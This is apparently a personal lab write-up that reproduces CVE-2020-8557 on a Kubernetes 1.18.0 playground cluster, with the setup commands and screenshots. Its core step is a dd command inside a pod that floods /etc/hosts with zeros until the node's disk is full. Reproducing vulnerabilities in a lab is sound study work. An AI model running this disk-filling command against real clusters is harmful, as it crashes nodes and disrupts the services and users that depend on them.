# k8s security [Node disk DOS by writing to container /etc/hosts] reproduce

| Author             | Date       |
| ------------------ | ---------- |
| Kaitao Qiu (Miles) | 2023/10/24 |

[TOC]

## background

it is a security issue about CVE-2020-8557

The Kubernetes kubelet component in versions 1.1-1.16.12, 1.17.0-1.17.8 and 1.18.0-1.18.5 do not account for disk usage by a pod which writes to its own /etc/hosts file. The /etc/hosts file mounted in a pod by kubelet is not included by the kubelet eviction manager when calculating ephemeral storage usage by a pod. If a pod writes a large amount of data to the /etc/hosts file, it could fill the storage space of the node and cause the node to fail.

## reproduce

login https://labs.play-with-k8s.com/
and create environment(set kubeadm and other kube-realted component with version 1.18.0) and create a master mode and a worker node.

```bash
kubeadm reset

yum remove kubeadm kubectl kubelet kubernetes-cni

yum install kubeadm-1.18.0 kubectl-1.18.0 kubelet-1.18.0 kubernetes-cni
 
kubeadm init --apiserver-advertise-address $(hostname -i) --pod-network-cidr 10.5.0.0/16

kubectl apply -f https://raw.githubusercontent.com/cloudnativelabs/kube-router/master/daemonset/kubeadm-kuberouter.yaml
 
kubeadm join 192.168.0.23:6443 --token XXXXXXXXXX \
    --discovery-token-ca-cert-hash XXXXXXXX
```

![image-20231024175337828](k8s%20security%20cve%20reproduce.assets/image-20231024175337828.png)

![image-20231024175343910](k8s%20security%20cve%20reproduce.assets/image-20231024175343910.png)

![image-20231024175616635](k8s%20security%20cve%20reproduce.assets/image-20231024175616635.png)

Create a pod with name `fill-disk-pod`

```bash
kubectl run fill-disk-pod --image=ubuntu -i --tty -- /bin/bash
# we can login this pod
kubectl exec -it fill-disk-pod -- /bin/bash
# Run the dd command in Pod to fill up the disk space This will create a large file that will gradually reduce the disk space
# This will create a very large file in the /ETC /HOSTS file, and gradually fills the disk space.
dd if=/dev/zero of=/etc/hosts count=1000000 bs=10M

```



![image-20231024181157411](k8s%20security%20cve%20reproduce.assets/image-20231024181157411.png)

And we can use 

```bash
watch df -h /var/lib/kubelet
```

To see the disk usage is going higher and higher and cause the available disk into 0.

![image-20231024181145962](k8s%20security%20cve%20reproduce.assets/image-20231024181145962.png)

![image-20231024181205960](k8s%20security%20cve%20reproduce.assets/image-20231024181205960.png)

